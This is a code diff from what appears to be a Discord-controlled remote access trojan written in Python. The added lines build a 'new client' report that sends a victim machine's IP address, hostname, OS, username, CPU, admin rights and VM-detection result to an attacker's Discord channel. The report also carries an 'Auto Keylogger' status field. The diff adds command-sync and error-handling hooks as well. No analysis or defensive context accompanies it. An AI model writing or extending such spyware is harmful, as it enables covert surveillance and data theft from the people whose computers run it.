@@ -31,9 +31,24 @@ class BOT(commands.Bot):
 
         # Creating welcome message for new client
         my_embed = discord.Embed(title = f"{MSG}", description = f"**Time: {now.strftime('%d/%m/%y %H:%M:%S')}**", color = COLOR)
+        my_embed.add_field(name = "**IP**", value = maciassdopia.getIP(), inline = True)
+        my_embed.add_field(name = "**Bits**", value = maciassdopia.getBits(), inline = True)
+        my_embed.add_field(name = "**HostName**", value = maciassdopia.getHostname(), inline = True)
+        my_embed.add_field(name = "**OS**", value = maciassdopia.getOS(), inline = True)
+        my_embed.add_field(name = "**Username**", value = maciassdopia.getUsername(), inline = True)
+        my_embed.add_field(name = "**CPU**", value = maciassdopia.getCPU(), inline = False)
+        my_embed.add_field(name = "**Is Admin**", value = maciassdopia.isAdmin(), inline = True)
+        my_embed.add_field(name = "**Is VM**", value = maciassdopia.isVM(), inline = True)
+        my_embed.add_field(name = "**Auto Keylogger**", value = False, inline = True)
 
-
-        await self.channel.send(embed=my_embed)
+        await self.channel.send(embed = my_embed)
+    
+    async def setup_hook(self):
+        await self.tree.sync(guild = GUILD)
+        
+    async def on_command_error(self, ctx, error):
+        my_embed = discord.Embed(title = f"**Error:** {error}", color=0xFF0000)
+        await ctx.reply(embed = my_embed)
 
 bot = BOT()
 
